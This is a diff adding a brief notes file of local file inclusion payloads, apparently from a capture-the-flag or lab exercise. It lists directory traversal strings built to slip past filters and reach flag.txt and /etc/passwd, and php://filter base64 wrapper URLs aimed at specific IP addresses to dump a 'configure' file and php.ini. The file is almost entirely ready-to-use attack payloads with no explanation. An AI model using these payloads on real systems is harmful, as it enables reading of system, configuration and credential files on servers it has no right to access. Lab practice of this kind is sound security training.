@@ -1,0 +1,10 @@
+
+languages/....//....//....//....//....//....//flag.txt
+?language=php://filter/read=convert.base64-encode/resource=configure
+/../../../../../../../etc/passwd
+# filter
+http://94.237.120.137:59967/index.php?language=php://filter/read=convert.base64-encode/resource=configure
+
+# PHP Wrappers
+
+http://94.237.48.51:32968/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
